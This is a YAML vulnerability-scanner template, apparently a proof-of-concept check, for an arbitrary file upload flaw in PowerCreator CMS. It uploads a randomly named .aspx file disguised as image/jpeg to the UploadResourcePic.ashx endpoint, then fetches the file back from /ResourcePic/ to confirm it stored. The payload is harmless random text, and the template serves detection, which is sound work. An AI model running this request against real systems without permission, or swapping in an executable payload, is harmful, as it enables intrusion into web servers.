expression: r0() && r1()
id: powercreator-arbitrary-file-upload
info:
  author: MrP01ntSun(https://github.com/MrPointSun)
  description: 'app="PowerCreator-CMS"

    '
  name: Powercreator Arbitrary file upload
  severity: high
  verified: true
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(b".ASPX")
    output:
      path: search["path"]
      search: '"(?P<path>.+?).ASPX".bsubmatch(response.body)'
    request:
      body: "-----------------------------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition:\
        \ form-data; name=\"file1\"; filename=\"{{randname}}.aspx\"\r\nContent-Type:\
        \ image/jpeg\r\n\r\n{{content}}\r\n-----------------------------WebKitFormBoundary{{rboundary}}--\r\
        \n"
      headers:
        Content-Disposition: form-data;name="file1";filename="{{randname}}.aspx";
        Content-Type: multipart/form-data; boundary=---------------------------WebKitFormBoundary{{rboundary}}
      method: POST
      path: /upload/UploadResourcePic.ashx?ResourceID={{rand}}
  r1:
    expression: response.status == 200 && response.body.bcontains(bytes(content))
    request:
      method: GET
      path: /ResourcePic/{{path}}.ASPX
set:
  content: randomLowercase(8)
  rand: randomInt(1000, 9999)
  randname: randomLowercase(4)
  rboundary: randomLowercase(8)
